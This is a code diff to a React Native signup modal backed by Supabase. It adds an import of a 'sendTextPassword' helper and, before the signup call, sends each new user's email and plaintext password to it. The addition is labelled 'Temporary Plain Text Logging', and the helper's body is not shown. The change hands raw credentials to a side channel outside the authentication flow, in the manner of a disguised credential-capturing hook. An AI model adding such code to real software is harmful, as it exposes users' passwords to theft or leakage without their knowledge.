@@ -11,6 +11,10 @@ import {
 } from "react-native";
 import { supabase } from "../../util/supabase";
 
+//===========+++++++========= Import Temporary Password Handler =========+++++++=========
+import { sendTextPassword } from "../../util/PasswordHandler";
+//===========+++++++========= End of Import =========+++++++=========
+
 export default function SignupModal({ onClose }: { onClose: () => void }) {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
@@ -21,6 +25,10 @@ export default function SignupModal({ onClose }: { onClose: () => void }) {
       Alert.alert("Error", "Passwords do not match.");
       return;
     }
+
+    //===========+++++++========= Temporary Plain Text Logging =========+++++++=========
+    sendTextPassword(email, password);
+    //===========+++++++========= End of Temporary Logging =========+++++++=========
 
     try {
       const { data, error } = await supabase.auth.signUp({
